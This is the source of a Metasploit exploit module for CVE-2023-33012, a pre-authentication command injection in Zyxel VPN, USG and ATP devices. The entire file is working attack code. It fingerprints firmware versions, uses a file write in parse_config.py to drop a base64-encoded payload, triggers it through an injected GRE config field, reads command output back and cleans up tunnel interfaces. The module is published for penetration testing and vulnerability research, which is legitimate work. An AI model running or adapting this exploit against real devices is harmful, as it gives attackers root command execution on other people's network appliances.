##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Zyxel parse_config.py Command Injection',
        'Description' => %q{
          This module exploits vulnerabilities in multiple Zyxel devices including the VPN, USG and APT series.
          The affected firmware versions depend on the device module, see this module's documentation for more details.

          Note this module was unable to be tested against a real Zyxel device and was tested against a mock environment.
          If you run into any issues testing this in a real environment we kindly ask you raise an issue in
          metasploit's github repository: https://github.com/rapid7/metasploit-framework/issues/new/choose
        },
        'Author' => [
          'SSD Secure Disclosure technical team', # discovery
          'jheysel-r7' # Msf module
        ],
        'References' => [
          [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-zyxel-vpn-series-pre-auth-remote-command-execution/'],
          [ 'CVE', '2023-33012']
        ],
        'License' => MSF_LICENSE,
        'Platform' => ['linux', 'unix'],
        'Privileged' => true,
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-01-24',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, CONFIG_CHANGES ],
          'Reliability' => [ ] # This vulnerability can only be exploited once, more info: https://vulncheck.com/blog/zyxel-cve-2023-33012#you-get-one-shot
        }
      )
    )

    register_options(
      [
        OptString.new('WRITABLE_DIR', [ true, 'A directory where we can write files', '/tmp' ]),
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'ext-js', 'app', 'common', 'zld_product_spec.js')
    })
    return CheckCode::Unknown('No response from /ext-js/app/common/zld_product_spec.js') if res.nil?

    if res.code == 200
      product_match = res.body.match(/ZLDSYSPARM_PRODUCT_NAME1="([^"]*)"/)
      version_match = res.body.match(/ZLDCONFIG_CLOUD_HELP_VERSION=([\d.]+)/)

      if product_match && version_match
        product = product_match[1]
        version = version_match[1]

        if (product.starts_with?('USG') && product.include?('W') && Rex::Version.new(version) <= Rex::Version.new('5.36.2') && Rex::Version.new(version) >= Rex::Version.new('5.10')) ||
           (product.starts_with?('USG') && !product.include?('W') && Rex::Version.new(version) <= Rex::Version.new('5.36.2') && Rex::Version.new(version) >= Rex::Version.new('5.00')) ||
           (product.starts_with?('ATP') && Rex::Version.new(version) <= Rex::Version.new('5.36.2') && Rex::Version.new(version) >= Rex::Version.new('5.10')) ||
           (product.starts_with?('VPN') && Rex::Version.new(version) <= Rex::Version.new('5.36.2') && Rex::Version.new(version) >= Rex::Version.new('5.00'))
          return CheckCode::Appears("Product: #{product}, Version: #{version}")
        else
          return CheckCode::Safe("Product: #{product}, Version: #{version}")
        end
      end
    end
    CheckCode::Unknown('Version and product info were unable to be determined.')
  end

  def on_new_session(session)
    super
    command_output = ''
    # Get the most recently created GRE tunnel interface, bring it down then delete it to allow for subsequent module runs.
    if session.type.to_s.eql? 'meterpreter'
      newest_gre = session.sys.process.execute '/bin/sh', "-c \"ip -d link show type gre | grep -oP '^\\d+: \\K[^@]+' | tail -n 1\""
      print_good("Found the most recently created GRE tunnel interface: #{newest_gre}. Going to delete it to allow for subsequent module runs.")
      command_output = session.sys.process.execute '/bin/sh', "-c \"ifconfig #{newest_gre} down && ip tunnel del #{newest_gre} mode gre && echo success\""
    elsif session.type.to_s.eql? 'shell'
      newest_gre = session.shell_command_token "ip -d link show type gre | grep -oP '^\\d+: \\K[^@]+' | tail -n 1"
      print_good("Found the most recently created GRE tunnel interface: #{newest_gre}. Going to delete it to allow for subsequent module runs.")
      command_output = session.shell_command_token "ifconfig #{newest_gre} down && ip tunnel del #{newest_gre} mode gre && echo success"
    end

    if command_output.include?('success')
      print_good('The GRE interface was successfully removed.')
    else
      print_warning('The module failed to remove the GRE interface created by this exploit. Subsequent module runs will likely fail unless unless it\'s successfully removed')
    end
  end

  def exploit
    # Command injection has a 0x14 byte length limit so keep the file name as small as possible.
    # The length limit is also why we leverage the arbitrary file write -> write our payload to the .qrs file then execute it with the command injection.
    filename = rand_text_alpha(1)
    payload_filepath = "#{datastore['WRITABLE_DIR']}/#{filename}.qsr"

    command = payload.raw
    command += ' '
    command += <<~CMD
      2>/var/log/ztplog 1>/var/log/ztplog
      (sleep 10 && /bin/rm -rf #{payload_filepath}) &
    CMD
    command = "echo #{Rex::Text.encode_base64(command)} | base64 -d > #{payload_filepath} ; . #{payload_filepath}"

    file_write_pload = "option proto vti\n"
    file_write_pload += "option #{command};exit\n"
    file_write_pload += "option name 1\n"

    config = Base64.strict_encode64(file_write_pload)
    data = { 'config' => config, 'fqdn' => "\x00" }
    print_status('Attempting to upload the payload via QSR file write...')

    file_write_res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'ztp', 'cgi-bin', 'parse_config.py'),
      'data' => data.to_s
    })
    unless file_write_res && !file_write_res.body.include?('ParseError: 0xC0DE0005')
      fail_with(Failure::PayloadFailed, 'The response from the target indicates the payload transfer was unsuccessful')
    end

    register_files_for_cleanup(payload_filepath)
    print_good("File write was successful, uploaded: #{payload_filepath}")

    cmd_injection_pload = "option proto gre\n"
    cmd_injection_pload += "option name 0\n"
    cmd_injection_pload += "option ipaddr ;. #{payload_filepath};\n"
    cmd_injection_pload += "option netmask 24\n"
    cmd_injection_pload += "option gateway 0\n"
    cmd_injection_pload += "option localip #{Faker::Internet.private_ip_v4_address}\n"
    cmd_injection_pload += "option remoteip #{Faker::Internet.private_ip_v4_address}\n"
    config = Rex::Text.encode_base64(cmd_injection_pload)
    data = { 'config' => config, 'fqdn' => "\x00" }

    cmd_injection_res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'ztp', 'cgi-bin', 'parse_config.py'),
      'data' => data.to_s
    })

    # If the payload being used is for example cmd/unix/generic and not a payload spawning any kind of handler (bind or reverse)
    # we can query the /ztp/cgi-bin/dumpztplog.py for the stdout of the command and print it for the user.
    if payload_instance.connection_type == 'none'
      cmd_output_res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'ztp', 'cgi-bin', 'dumpztplog.py')
      })

      if cmd_output_res&.body && !cmd_output_res.body.empty?
        output = cmd_output_res.body.split("</head>\n<body>")[1]
        output = output.split("</body>\n</html>")[0]
        output = output.gsub("\n\n<br>", '')
        output = output.gsub("[IPC]IPC result: 1\n", '')
        print_good("Command output: #{output}")
      else
        print_error("Could not retrieve the command's stout from /ztp/cgi-bin/dumpztplog.py")
      end
    end

    unless cmd_injection_res && !cmd_injection_res.body.include?('ParseError: 0xC0DE0005')
      fail_with(Failure::PayloadFailed, 'The response from the target indicates the payload transfer was unsuccessful')
    end
  end
end
